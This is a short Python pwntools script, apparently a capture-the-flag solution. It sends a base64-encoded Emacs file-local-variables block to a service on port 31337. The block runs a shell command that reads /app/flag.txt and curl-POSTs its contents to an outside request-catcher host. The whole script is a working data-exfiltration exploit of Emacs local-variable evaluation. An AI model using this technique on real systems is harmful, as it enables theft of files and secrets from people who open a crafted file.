import base64
from pwn import *


recipe = """# Local Variables:
# cooking-motivation-generator: (shell-command (concat "curl -X POST -d \\"" (with-temp-buffer (insert-file-contents "/app/flag.txt") (buffer-string)) "\\" https://nyaaa.requestcatcher.com/test"))
# End:
"""
print(recipe)
print(base64.b64encode(recipe.encode()))
io = remote("0.0.0.0", 31337)
io.sendlineafter(b"! ", base64.b64encode(recipe.encode()))
io.interactive()
